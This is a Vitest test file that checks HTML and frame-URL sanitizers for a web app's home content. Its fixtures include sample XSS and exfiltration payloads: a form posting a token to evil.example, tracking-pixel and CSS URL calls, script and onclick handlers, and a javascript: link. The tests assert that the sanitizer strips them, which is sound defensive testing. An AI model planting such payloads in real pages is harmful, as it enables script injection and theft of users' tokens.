import { describe, expect, it } from 'vitest'
import {
  sanitizeHomeContentFrameUrl,
  sanitizeHomeContentHtml
} from '@/utils/homeContent'

describe('home content sanitization', () => {
  it('removes active content, forms, media, styles, and event handlers', () => {
    const result = sanitizeHomeContentHtml(`
      <section style="background:url(https://evil.example/track)">
        <h2 onclick="steal()">Welcome</h2>
        <script>steal()</script>
        <form action="https://evil.example/collect"><input name="token"></form>
        <img src="https://evil.example/pixel.png">
        <iframe src="https://evil.example"></iframe>
      </section>
    `)

    expect(result).toContain('<section>')
    expect(result).toContain('<h2>Welcome</h2>')
    expect(result).not.toMatch(/script|form|input|img|iframe|onclick|style|evil\.example/i)
  })

  it('keeps safe links and forces a new isolated browsing context', () => {
    const result = sanitizeHomeContentHtml('<a href="https://docs.example.com/guide">Guide</a>')

    expect(result).toContain('href="https://docs.example.com/guide"')
    expect(result).toContain('target="_blank"')
    expect(result).toContain('rel="noopener noreferrer"')
  })

  it('removes unsafe link protocols', () => {
    const result = sanitizeHomeContentHtml('<a href="javascript:alert(1)">Open</a>')

    expect(result).toContain('<a>Open</a>')
    expect(result).not.toContain('javascript:')
  })

  it('allows HTTPS frames while stripping URL credentials', () => {
    expect(sanitizeHomeContentFrameUrl('https://name:password@docs.example.com/home')).toBe(
      'https://docs.example.com/home'
    )
  })

  it('rejects insecure remote frame URLs', () => {
    expect(sanitizeHomeContentFrameUrl('http://docs.example.com/home')).toBe('')
  })
})
